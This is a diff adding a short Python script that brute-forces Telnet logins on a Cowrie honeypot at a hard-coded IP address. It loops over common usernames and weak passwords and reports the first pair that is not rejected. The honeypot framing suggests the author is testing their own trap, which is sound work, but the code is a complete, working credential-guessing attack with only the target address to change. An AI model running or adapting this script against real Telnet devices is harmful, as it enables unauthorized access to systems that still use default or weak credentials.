@@ -1,0 +1,36 @@
+#this file is for the script attack on the honeypot python
+import telnetlib
+
+# Target server and port
+HOST = "172.234.201.171"  # Cowrie server IP
+PORT = 23                 # Cowrie Telnet port
+
+# Username and password lists
+usernames = ["admin", "root", "user"]
+passwords = ["1234", "password", "admin123", "letmein", "qwerty"]
+
+for username in usernames:
+    for password in passwords:
+        try:
+            # Connect to the Telnet server
+            tn = telnetlib.Telnet(HOST, PORT)
+            print(f"Trying username: {username}, password: {password}")
+
+            # Simulate login attempt
+            tn.read_until(b"login: ")
+            tn.write(username.encode('ascii') + b"\n")
+            tn.read_until(b"Password: ")
+            tn.write(password.encode('ascii') + b"\n")
+
+            # Wait for response and check if login is successful
+            response = tn.read_some().decode('utf-8')
+            if "incorrect" not in response.lower():
+                print(f"Success: Username: {username}, Password: {password}")
+                tn.write(b"exit\n")  # Exit the session
+                break  # Stop after the first success
+            else:
+                print("Login failed")
+            
+            tn.close()
+        except Exception as e:
+            print(f"Connection failed for {username}:{password} - {e}")
